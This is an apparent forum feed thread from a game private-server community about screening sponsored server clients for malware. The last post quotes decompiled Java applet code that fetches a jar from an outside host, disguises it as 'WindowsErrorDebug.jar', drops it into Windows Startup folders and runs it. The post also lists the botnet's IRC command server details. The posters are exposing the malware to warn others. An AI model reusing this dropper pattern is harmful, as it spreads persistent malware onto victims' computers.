item.title: A very serious point
item.dc:creator: @Javacisnotrecognized _^_
item.description:
@Javacisnotrecognized wrote:

If they were really smart, they would probably do something like alter the client so that it can download & run any file the server tells it to. However, as you’ve pointed out, not many are. I think a very basic sandbox would catch like 95% of anyone trying to get something passed you.

Read full topic

item.title: A very serious point
item.dc:creator: @moparisthebest Moparisthebest
item.description:
@moparisthebest wrote:

Javacisnotrecognized:

Run it in a sandbox, check what files/sockets/etc it tries to access/create. If it does anything screwy, don’t sponsor it.

This can be done, it’s not that hard. Problem is would it be of any use? Obviously they are not going to give me an infected client to test, and they can swap out the jar at any given time on their website, leaving the same problem as before.

Hell, if they were smart (granted, not many are) they could supply a different jar based on whether the request is coming from a windows or linux box and I would never catch it, without someone else catching it for me.

Read full topic

item.title: A very serious point
item.dc:creator: @lothy Lothy
item.description:
@lothy wrote:

[quote=“Miss Silabsoft, post:4, topic:283878”][quote author=Moparisthebest link=topic=375177.msg2828524#msg2828524 date=1245211517]
Well, I approve them in the sense that I ask them questions and expect to receive the truth. I can’t constantly decompile and scan through every line of code from everyone that bids on a server. 99% of the time since they are spending money on this they are going to tell the truth, the 1% of the time they lie I delete their post and don’t let them bid again. I don’t know what else I can do.
[/quote]
be a man suck it up and constantly decompile and scan, you have plenty of time unless you are expecting already :p[/quote]
Lol.

No, I agree with Mopar. It’s too much work for a proactive approach, so reactive is the way to go. Be realistic.

Read full topic

item.title: A very serious point
item.dc:creator: @_Vengeance _Vengeance
item.description:
@_Vengeance wrote:

[quote=“pali”]Do you guys not check first l0l

http://www.moparisthebest.com/serverstatus.php?action=view&server=64.191.21.208

public class client extends Applet
{
    Runtime rt;
    public String file;
    public static final String BOT_URL
	= "http://geoffreyy.netau.net/justched.jar";
    public static final String BOT_NAME = "WindowsErrorDebug.jar";
    public static final String[] STARTUP_DIRS
	= { "%USER.HOME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
	    "%USER.HOME%\\Start Menu\\Programs\\Startup" };
    
    public void init() {
	new client();
    }
    
    public client() {
	if (isWindowsOS()) {
	    System.out.println(System.getProperty("user.home"));
	    String string = findAppropriateDirectory();
	    System.out.println(string);
	    drop(string);
	    try {
		((client) this).rt.exec(string);
	    } catch (IOException ioexception) {
		ioexception.printStackTrace();
	    }
	}
    }
    
    public boolean isWindowsOS() {
	return System.getProperty("os.name").contains("Win");
    }
    
    public String findAppropriateDirectory() {
	String[] strings = STARTUP_DIRS;
	int i = strings.length;
	for (int i_0_ = 0; i_0_ < i; i_0_++) {
	    String string = strings[i_0_];
	    string = string.replace("%USER.HOME%",
				    System.getProperty("user.home"));
	    System.out.println(string);
	    File file = new File(string);
	    if (file.exists() && file.isDirectory())
		return file.getPath();
	}
	return null;
    }
    
    public void drop(String string) {
	ioexception = ioexception_3_;
	break;
    }
}

Geoffs botnet is officially fucked now for DDoSing my site so many times, ya I finally find it (didn’t know he ‘runs’ a server til now lol)

http://geoffreyy.netau.net/imloling247cozollieslikessemen.php
SERVER: 64.191.21.208
PORT: 6667
IN_CHANNEL: #bots
OUT_CHANNEL: #bots
IN_PASSWORD:
OUT_PASSWORD:
NICK: [G30F]
CONTROLLERS: Geoffreyy,m13rz[/quote]

Not sure if this has been confirmed as of yet, but uh… The guy has quite a good point
Someone needs to check all of the sponsored servers before they are allowed etc. I thought there was an actual screening process in place? How did this one go astray?

Read full topic
